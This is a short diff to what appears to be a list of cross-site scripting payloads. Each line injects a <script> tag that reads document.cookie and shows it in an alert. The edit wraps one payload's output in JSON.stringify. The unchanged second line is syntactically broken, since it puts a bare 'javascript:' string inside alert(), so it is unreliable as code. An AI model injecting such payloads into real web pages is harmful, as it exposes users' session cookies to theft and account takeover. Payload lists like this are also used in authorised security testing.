@@ -1,3 +1,3 @@
-<script>alert(Object.fromEntries(document.cookie.split('; ').map(c => c.split('='))));</script>
+<script>alert(JSON.stringify(Object.fromEntries(document.cookie.split('; ').map(c => c.split('=')))));</script>
 <script>alert(javascript:window.alert(document.cookie.split(';').join(';\r\n')));</script>
 .
